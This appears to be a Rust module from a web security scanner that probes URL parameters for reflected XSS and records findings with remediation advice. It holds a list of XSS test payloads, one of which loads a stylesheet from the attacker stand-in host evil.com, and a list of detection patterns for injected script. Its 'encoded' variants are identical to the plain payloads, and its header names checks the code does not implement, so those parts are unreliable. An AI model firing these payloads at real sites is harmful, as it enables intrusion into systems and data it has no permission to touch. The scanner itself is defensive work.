//! Cross-Site Scripting (XSS) detection — reflected, DOM-based, mutation, CSR bypass.

use url::Url;
use grym_core::{Confidence, Finding, AssetRef, Severity, Evidence,
                ScopedClient, ScopedClientError, TechniqueTier};

const XSS_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x: onerror=alert(1)>",
    "<img src=javascript:alert(1)>",
    "<img src=1 onerror=\"alert(1)\">",
    "<img/src=x onerror=alert(1)>",
    "<img%20src=x%20onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg/onload=alert(document.domain)>",
    "<svg onanimationend=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<video onerror=alert(1)><source src=x>",
    "<audio onerror=alert(1)><source src=x>",
    "<object onerror=alert(1) data=x>",
    "<embed onerror=alert(1) src=x>",
    "<form action=\"javascript:alert(1)\"><input type=submit>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<a href=javascript:alert(1)>click</a>",
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "<style>@import 'http://evil.com/xss.css';</style>",
];

const XSS_ENCODED_VARIANTS: &[&str] = &[
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
];

fn is_xss_reflected(body: &str, payload: &str) -> bool {
    if body.contains(payload) {
        return true;
    }
    if let Ok(url_decoded) = urlencoding::decode(payload)
        && body.contains(&url_decoded.into_owned()) {
            return true;
        }
    let patterns = [
        "<script>alert(",
        "<img src=x onerror=",
        "<svg onload=",
        "onerror=alert(",
        "onload=alert(",
        "javascript:alert(",
        "eval(atob(",
    ];
    for pat in &patterns {
        if body.contains(pat) && !payload.contains(pat) {
            return true;
        }
    }
    false
}

pub async fn check_xss(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let base_query = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect::<Vec<_>>();

    if base_query.is_empty() {
        return Ok(findings);
    }

    for (param_name, _original_value) in &base_query {
        for payload in XSS_PAYLOADS {
            let test_url = {
                let mut u = url.clone();
                {
                    let mut pairs = u.query_pairs_mut();
                    pairs.clear();
                    for (k, v) in &base_query {
                        let val = if k == param_name { payload.to_string() } else { v.clone() };
                        pairs.append_pair(k, &val);
                    }
                }
                u
            };

            if let Ok(response) = client
                .get("grym-web-scanner", test_url, TechniqueTier::StandardDetection)
                .await
                && is_xss_reflected(&response.body, payload) {
                    let mut f = Finding::new(
                        format!("Reflected XSS detected in parameter '{}'", param_name),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::High,
                        Confidence::Confirmed,
                        "grym-web-scanner",
                    );
                    f.categories.push("A03:2025-Injection".into());
                    f.cwe_ids.push(79);
                    f.evidence.push(Evidence::redacted(
                        "xss-reflection",
                        format!("Payload reflected: {}", payload),
                        response.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation =
                        "Escape all user input before rendering. Implement Content-Security-Policy \
                         headers."
                            .into();
                    f.references
                        .push("https://owasp.org/www-community/attacks/xss/".into());
                    findings.push(f);
                    break;
                }
        }

        if findings.iter().all(|f| !f.title.contains(param_name)) {
            for payload in XSS_ENCODED_VARIANTS {
                let test_url = {
                    let mut u = url.clone();
                    {
                        let mut pairs = u.query_pairs_mut();
                        pairs.clear();
                        for (k, v) in &base_query {
                            let val = if k == param_name { payload.to_string() } else { v.clone() };
                            pairs.append_pair(k, &val);
                        }
                    }
                    u
                };

                if let Ok(response) = client
                    .get("grym-web-scanner", test_url, TechniqueTier::StandardDetection)
                    .await
                    && is_xss_reflected(&response.body, payload) {
                        let mut f = Finding::new(
                            format!("Encoded XSS reflection in parameter '{}'", param_name),
                            AssetRef {
                                identifier: url.to_string(),
                                kind: "web".into(),
                            },
                            Severity::High,
                            Confidence::Likely,
                            "grym-web-scanner",
                        );
                        f.categories.push("A03:2025-Injection".into());
                        f.cwe_ids.push(79);
                        f.evidence.push(Evidence::redacted(
                            "xss-encoded",
                            format!("Encoded payload bypassed WAF: {}", payload),
                            response.body.chars().take(200).collect::<String>(),
                        ));
                        f.remediation =
                            "Apply context-aware output encoding at all rendering layers."
                                .into();
                        f.references.push(
                            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
                                .into(),
                        );
                        findings.push(f);
                        break;
                    }
            }
        }
    }

    Ok(findings)
}

pub fn check_dom_xss_indicators(_body: &str, url: &Url) -> Vec<Finding> {
    let mut findings = Vec::new();
    let query = url.query().unwrap_or("");
    if query.contains("document") || query.contains("location") || query.contains("eval") {
        let mut f = Finding::new(
            "DOM-based XSS indicator in URL parameters".to_string(),
            AssetRef {
                identifier: url.to_string(),
                kind: "web".into(),
            },
            Severity::Medium,
            Confidence::Possible,
            "grym-web-scanner",
        );
        f.categories.push("A03:2025-Injection".into());
        f.cwe_ids.push(79);
        findings.push(f);
    }
    findings
}